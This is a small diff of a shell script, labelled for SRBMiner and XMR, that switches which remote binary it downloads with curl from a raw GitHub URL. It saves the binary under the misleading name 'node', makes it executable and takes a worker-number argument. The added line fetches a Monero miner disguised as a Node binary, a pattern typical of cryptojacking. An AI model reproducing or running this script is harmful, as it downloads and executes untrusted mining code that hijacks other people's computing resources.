@@ -1,10 +1,10 @@
 #!/bin/sh
 # SRBMiner
- curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
+#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
 # cNfj5q6A7c4yM3KD
 
 # xmr
-# curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node
+curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node
 
 chmod +x node
 WORKER_NUMBER=$1
